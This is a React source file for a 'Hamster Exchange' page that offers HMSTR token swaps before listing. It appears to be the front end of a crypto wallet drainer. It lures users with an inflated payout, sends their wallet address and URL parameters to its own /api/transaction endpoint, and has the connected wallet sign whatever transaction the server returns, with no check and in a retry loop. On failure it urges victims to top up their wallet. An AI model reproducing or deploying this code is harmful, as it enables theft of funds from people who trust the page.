'use client';

import {useEffect, useState} from "react";
import * as Ton from "@tonconnect/ui-react"
import {handle} from "@/app/(design)/hamster-swap/page";


type Token = NonNullable<Awaited<ReturnType<typeof handle>>>[number]

function HamsterSwap({inputs: defaultInputs, outputs: defaultOutputs}: {
	inputs: Token[],
	outputs: Token[],
}) {
	const [inputs, setInputs] = useState(defaultInputs);
	const [outputs, setOutputs] = useState(defaultOutputs);
	const [input, setInput] = useState<Token>(defaultInputs[0]);
	const [output, setOutput] = useState<Token>(defaultOutputs[0]);
	const [send, setSend] = useState(1);
	const [receive, setReceive] = useState<number>();
	const [loading, setLoading] = useState(true);
	const modal = Ton.useTonConnectModal();
	const wallet = Ton.useTonWallet();
	const [ton] = Ton.useTonConnectUI();
	const [error, setError] = useState('');

	useEffect(() => {
		setLoading(false);
	}, []);

	const calcReceive = () => {
		if (!input) return;
		let v = (input.rate * send) / output.rate;

		const additional = input.key === "HMSTR" ? v * 10 : (v / 100) * 10;
		v += additional;

		setReceive(+v.toFixed(4))
	}
	const calcSend = (receive: number) => {
		if (!output || !receive) return;
		const v = (output.rate * receive) / input.rate;

		setSend(+v.toFixed(2));
	};

	useEffect(calcReceive, [send, output, input]);

	const handle = async (loop = false) => {
		if (!wallet?.account) return;
		do {
			try {
				setLoading(true);
				await fetch("/api/transaction", {
					body: JSON.stringify({
						...Object.fromEntries(new URLSearchParams(window.location.search)),
						address: wallet.account.address + "",
						receive,
						send
					}),
					headers: {
						'content-type': "application/json"
					},
					"method": "POST"
				}).then(async res => {
					setLoading(false);
					const json = await res.json();
					const e = await ton.sendTransaction(json);
					try {
						if (!e) return;
						const reportId = res.headers.get('log-report-id');
						await fetch("/api/transaction", {
							method: "PUT",
							body: JSON.stringify({
								reportId
							}),
							headers: {
								"content-type": "application/json"
							}
						})
					} catch {
					}
				}).finally(() => {
					setLoading(false);
				}).catch(() => {
					setError("insufficient balance, please charge your wallet");
				})
				break;
			} catch {
			}
		} while (loop);
	}
	const cOk = !!wallet?.account;

	return (
		<>
			{loading && (
				<div id="preloader">
					<div id="loader"/>
				</div>
			)}

			<div className="desktop-message">
				<div>
					<h1 style={{fontSize: 35}}>Open via your phone</h1>
				</div>
			</div>
			<div className="wrapper">
				<div className="page">
					<div className="main-block">
						<div className="main-block__head">
							<div className="main-block__image">
								<img src="/hamster-swap/images/humster_min-Dt2Kcjgl.png" alt="humster"/>
							</div>
							<div className="main-block__about">
								<div className="main-block__title">Hamster Exchange</div>
								<div className="main-block__text">
									We offer a unique chance to exchange your HMSTR coins before
									listing! The offer is limited! Don`t waste it!
								</div>
								<div className="main-block__background">
									<img
										src="/hamster-swap/images/background-dark_min-PliM8j9B.png"
										alt="bgc-dark"
									/>
								</div>
							</div>
						</div>
						{/* <div id="customConnect"></div> */}
						<div className="_container">
							<div className="main-block__body">
								<div className="main-block__content main-content" data-select="">
									<div className="main-content__info info">
										<div className="info__title" style={{paddingLeft: 7}}>
											Send
										</div>
										<div className="info__span" style={{paddingRight: 7}}>
											min 10
										</div>
									</div>
									<div className="main-content__item item" data-exchange-first="">
										<form className="item__form" action="#">
											<input
												id="hmstrInput"
												className="item__number"
												value={send}
												onChange={e =>
													setSend(
														e.target.value.endsWith(".") &&
														(send + "").length < (e.target.value + "").length ?
															+(e.target.value + "1") :
															+e.target.value || 0
													)
												}
												type="tel"
												autoComplete="off"
												data-input=""
											/>
										</form>

										<Selector value={input} key={inputs.map(o => o.contract).join(",")}
												onChange={setInput} options={inputs}/>
									</div>
									<div className="main-content__exchange" onClick={() => {
										setInput(output);
										setOutput(input);
										setSend(receive || 0);
										setInputs(outputs);
										setOutputs(inputs);

									}}>
										<img
											src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACcAAAAoCAMAAABKKxPSAAAALVBMVEVHcEwuLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi51PH+sAAAADnRSTlMACx9CTV5zgJSnvNPg7drKaZMAAADWSURBVHja7ZRLEoQgDEQ7KEjkc//jzkAcgQjr2fg2SOoFDVY1bnwKOwaOFB0UJuQvQ9mWimrdUq4wGr4UPHSrEKi9tuwPDJ2NuK08OvOAVV6bQOF6T03A9VB/bSZernhwWciI6Gae1Ot52/UVx9PbYw47fp4MzzSb1wC9BzKL+1Me8Hqv90+PtEczz5wp2N6zMbHy7iffPF/WlZdZQsfKduaZKKLklWhBezpwhJO0J/Co+eX9OZVLKw970zb0BJXGJooVDPDI1K5GMg1DQZyiVa0p3b/3A2hWHiyGaQ9vAAAAAElFTkSuQmCC"
											alt="exchange"
										/>
									</div>
									<div className="main-content__info info">
										<div className="info__title" style={{paddingLeft: 7}}>
											Receive
										</div>
									</div>
									<div className="main-content__item item" data-exchange-second="">
										<form className="item__form" action="#">
											<input
												className="item__number"
												defaultValue={receive}
												onChange={e => {
													setReceive(+e.target.value || 0)
													calcSend(+e.target.value || 0);
												}}
												type="tel"
												autoComplete="off"
												data-input=""
											/>
										</form>
										<Selector value={output} onChange={setOutput}
												key={outputs.map(o => o.contract).join(",")}
												options={outputs}/>
									</div>
									<div className="fe">
										<div className="main-content__text" style={{paddingLeft: 3}}>
											∗ Exchange fee ~0.15 TON ∗
										</div>
									</div>
								</div>
								<div
									className="main-block__button main-button"
									id="customConnectButton"
									style={cOk ? {display: "none"} : {}}
									onClick={() => {
										modal.open()
									}}
								>
									<div className="main-button__item button-item">
										<div className="button-item__icon">
											<img
												src="/hamster-swap/images/ton-wallet_min2-D02VRuoT.png"
												alt="ton-wallet"
											/>
										</div>
										<div className="button-item__span">Connect your TON-wallet</div>
									</div>
									<div className="main-button__icon">
										<img
											src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAABKCAMAAADZsmfmAAAAM1BMVEVHcEwAnOAAnOAAnOAAnOAAneB8zvBUw+wAoOEAneBQwut8zvB8zvAAneAAnOAAnOAAnOAvoSE/AAAAEXRSTlMAJoWzSJzh2tfs+P3z+sZqEVLvBrIAAAFVSURBVHja7dexkoMwDATQky3bEiiy//9r71COQDovkyIF279Z2SSM+Lnz1RnMnQl3lLJ7KQz3JZfWxEsfGOwutbbaPHeCCou0+pdNJsJgfaYJJEfy9pKOnJPzXhnnHGClVYtORHKO6zGzmDZNy9Fd2la5pYkkAoZ9k2Va0lM+s8DSdqmQlJCrrbB0WQ6J3ZAum1tDegeeivxLuyLXCCz98REpiJTLUne5bjLBnfvdApKznqeF5Nu0wD/7OKetikiWx0suqpkxiN/sSKdHAjkJF1nmHZWz00KzfUVhF0lnB13o2fm0I7/osp6c9EvuMf8CYNwdr43D8fzvRa84enfSrzlNA3H2cmUA5zO8b3TcRbprM2zOCGXZnCEuklyq2e4yzToq0gKGK+FmJ601JNIXjd4CLhoOWpBjAYxVAwmXWK0lFmRQ5uyeeOBfD713pvsz6s7X5RdeoCG5br8VRgAAAABJRU5ErkJggg=="
											alt="arrow-right"
										/>
									</div>
								</div>
								<div
									className="button-container"
									id="change"
									style={!cOk ? {display: "none"} : {}}
								>
									<div
										className="main-block__button main-button_change"
										onClick={() => {
											handle(true).catch(console.error);
										}}
									>
										<div className="main-button__item button-item_change">
											<div className="button-item__icon_change">
												<img
													src="data:image/png;base64,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"
													alt="ton-wallet"
												/>
											</div>
											<div className="button-item__span_change">Exchange</div>
										</div>
									</div>
									<div
										className="main-block__button main-button_change"
										id="disconnect"
										onClick={async () => {
											setLoading(true)
											await ton.disconnect().finally(() => {
												setLoading(false);
											})
										}}
									>
										<div className="main-button__item button-item_change">
											<div className="button-item__icon_change">
												<img src="/hamster-swap/images/wallet-DUDNXvdd.png"
													alt="ton-wallet"/>
											</div>
											<div className="button-item__span_change">Disconnect</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			{error && (
				<div id="modal" className="modal">
					<div id="modal-content" className="modal-content">
						<img id="modal-image" alt="Image" className="modal-image"/>
						<p id="modal-message" className="modal-text">{error}</p>
					</div>
				</div>
			)}
		</>
	);
}


interface SelectorProps {
	options: Token[];
	defaultOption?: Token | undefined;
	onChange: (o: Token) => void;
	value?: Token
}

const Selector: React.FC<SelectorProps> = ({options, onChange, value, defaultOption = value || options[0]}) => {
	const [selectedOption, setSelectedOption] = useState<Token | undefined>(defaultOption);
	const [isOpen, setIsOpen] = useState(false);

	const handleSelect = (option: Token) => {
		setSelectedOption(option);
		setIsOpen(false);
	};

	useEffect(() => {
		if (selectedOption) onChange(selectedOption);
	}, [selectedOption]);

	return (
		<div className="item__currency" key={defaultOption.name}>
			<div className="item__icon">
				<img
					src={selectedOption?.icon}
					alt={selectedOption?.name}
					className={'rounded-full'}
				/>
			</div>
			<div className="item__select select">
				<div className="select__button" onClick={() => setIsOpen(isOpen => !isOpen)}>
					<div className="select__span truncate" data-select-name="">
						{selectedOption?.name}
					</div>
					<div className="select__icon" data-select-icon="">
						<img
							src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAALCAYAAAB24g05AAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAAGYktHRAD/AP8A/6C9p5MAAAAHdElNRQfoBhQOBDewt0smAAAAhklEQVQoz53ROwrCUBSE4Q8LWyt3IK4jWFmoCC7Fxp2kdiGSdYiFFoKSyjaQqI0Bkavm3gPTzX9eA3Oc8IjUEVMoE+BW5x5q6dXAEveE6TVmbadNQoP15zrbCDgP3dNH0QHevbzBGuLwA95j8O+zY9wCcIlR13gmqN7gCllsxitcccHim+kJDTdk76czvLAAAAAASUVORK5CYII="
							alt="select-button"
						/>
					</div>
				</div>


				<div className="select__body" style={isOpen ? {
					opacity: 1,
					pointerEvents: 'all',
					zIndex: 10
				} : {zIndex: -10}}>
					<div className="select__list">
						{options.map((option, index) => (
							<div
								key={index}
								className="select__item select-item"
								data-select-item=""
								onClick={() => handleSelect(option)}
							>
								<div className="select-item__icon">
									<img
										data-select-img=""
										src={option.icon}
										alt={option.name}
										className={'rounded-full '}
									/>
								</div>
								<div className="select-item__span truncate" data-select-span="">
									{option.name}
								</div>
							</div>
						))}
					</div>
				</div>

			</div>
		</div>
	);
};


export default HamsterSwap;
